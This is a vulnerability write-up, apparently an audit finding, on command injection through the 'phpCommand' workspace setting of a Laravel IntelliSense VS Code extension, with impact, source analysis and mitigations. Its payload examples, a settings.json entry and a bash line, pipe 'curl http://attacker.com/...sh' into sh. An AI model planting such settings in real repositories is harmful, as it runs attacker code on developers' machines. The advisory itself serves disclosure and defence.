# Critical Vulnerabilities Identified in `vscode-laravel-extra-intellisense`

## 1. Remote Command Injection via PHP Command Configuration (`phpCommand` setting)

### Description:

The Laravel Extra Intellisense VSCODE extension provides customizable PHP command execution through the configuration setting `"LaravelExtraIntellisense.phpCommand"`. Due to the lack of sanitization, an attacker could exploit this feature by crafting a specially designed Laravel repository containing malicious workspace settings (`.vscode/settings.json`). The vulnerability can be exploited through the following detailed steps:

1. **Create a Malicious Laravel Repository:**
   Attacker creates a repository with a directory `.vscode/settings.json` file, containing malicious PHP execution command:
   ```json
   {
     "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; curl http://attacker.com/shell.sh | sh"
   }
   ```

2. **Victim Clones and Opens Repository:**
   The victim (who has installed and enabled the Laravel Extra Intellisense extension) clones the malicious repository and opens it with VSCode. The VSCode environment automatically loads the workspace-specific `.vscode/settings.json` configurations.

3. **Automatic Execution of Malicious Commands:**
   The Laravel Extra Intellisense extension regularly executes the user-specified PHP command internally (for indexing Laravel routes, views, or models). Due to unvalidated execution of external commands defined by configuration, the injected command is executed automatically by the extension without explicit user consent.

4. **Malicious Payload Execution:**
   The victim's environment automatically executes arbitrary attacker-supplied code, remotely leveraging command-line injection to download and execute scripts controlled by attackers.

### Impact:

This vulnerability allows attackers to achieve Remote Code Execution (RCE), enabling unauthorized arbitrary command execution in the victim's environment without explicit user interaction (other than opening the project in VSCode). Consequences may include:

- Full compromise of victim's development environment.
- Installation of malware/ransomware or establishing further persistence.
- Potential for lateral movement within corporate networks.
- Theft and exfiltration of sensitive source code, credentials, and personal data.
- Loss of integrity and confidentiality in the victim environment.

### Vulnerability Rank:

⚠️ **Critical**

### Currently Implemented Mitigations:

At the present time, **no explicit mitigations** exist in the codebase to address or restrain arbitrary execution through the `'phpCommand'` configuration option.

### Missing Mitigations:

The project currently lacks crucial security dimensions to address this issue, specifically:

- **Command Validation and Sanitization:**
  Before execution, ensure the commands only include safe predefined structures without arbitrary execution capabilities.

- **Allow-listing (Whitelisting) Commands:**
  Restrict execution options to a known-safe list of commands or execution environments to ensure attackers can't arbitrarily execute system commands.

- **Workspace Trust Enforcement:**
  Integration with VSCode Workspace Trust API, allowing explicit confirmation from the user before potentially dangerous commands from external workspace configurations are executed automatically.

- **Explicit Security Warnings & User Confirmation Dialogs:**
  Provide clear warnings in documentation and require user confirmation (explicit opt-in) for execution of external or custom-defined and potentially unsafe PHP command configurations.

### Preconditions:

- Victim must have the Laravel Extra Intellisense extension installed and activated in Visual Studio Code.
- Victim must clone or open a maliciously crafted Laravel repository containing manipulated configurations within `.vscode/settings.json`.

### Source Code Analysis (Detailed Steps):

Inspecting the project's source code, specifically the `src/helpers.ts` file, reveals the root cause of the vulnerability:

```typescript
let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
let command = commandTemplate.replace("{code}", code);

// Direct execution of the command without sanitization or validation
cp.exec(command, (error, stdout, stderr) => { ... });
```

The following vulnerabilities in the implementation were identified clearly:

- The code directly fetches the `LaravelExtraIntellisense.phpCommand` configuration from workspace settings, which can be defined or manipulated by an external attacker through a maliciously prepared Laravel repository.
- No validation, allow-listing or sanitization of this command data is performed.
- The application directly executes this arbitrary configuration value via `child_process.exec()`, enabling unrestricted RCE.

### Security Test Case (Detailed Verification):

To precisely verify the vulnerability in an external attack scenario, the following reproducible test demonstrates exploitation:

**Test Environment Setup:**

- Prepare a malicious git-hosted Laravel repository named `malicious-laravel-project`.
- Include the following malicious `.vscode/settings.json`:
```json
{
  "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; curl http://attacker.com/malicious.sh | sh"
}
```
- Host a dummy external exploitation-logging script (`malicious.sh`) at `http://attacker.com/malicious.sh`.

**Attack Execution Steps:**

1. Victim (with the vulnerable extension installed and enabled) clones the crafted `malicious-laravel-project` repository.
2. Victim opens the cloned project in VSCode. VSCode immediately loads workspace configurations, including the malicious `phpCommand` setting automatically defined by the attacker.
3. The extension triggers automatic or periodic indexing or Laravel-related information retrieval, resulting in automatic execution of the malicious command defined by the attacker.
4. On victim environment, the command executed is effectively:
```bash
php -r "{code}"; curl http://attacker.com/malicious.sh | sh
```
5. The command fetches and runs attacker-controlled malicious shell script, demonstrating successful command injection and remote code execution.

**Confirmation of Exploit:**

- Attacker confirms via server logs or listener at attacker.com that the malicious payload manifested successfully on the victim's machine, confirming the presence of the vulnerability.

---

## Conclusion and Recommendations:

Only this **Critical** Remote Command Injection vulnerability exists according to the provided criteria and detailed analysis. No additional vulnerabilities satisfying defined criteria were identified.

**Immediate Recommended Actions:**

- Urgently implement strict command validation, sanitization, and allow-listing to prevent arbitrary command execution.
- Leverage VSCode's built-in Workspace Trust API and security mechanisms.
- Communicate risks explicitly in the documentation and adopt explicit user confirmation prompts to warn and notify users before executing potentially dangerous commands.
- Issue enhanced secure version of the extension promptly along with appropriate notifications to existing users detailing significant security improvements.

No further vulnerabilities exist beyond the critical remote command injection issue explicitly described.
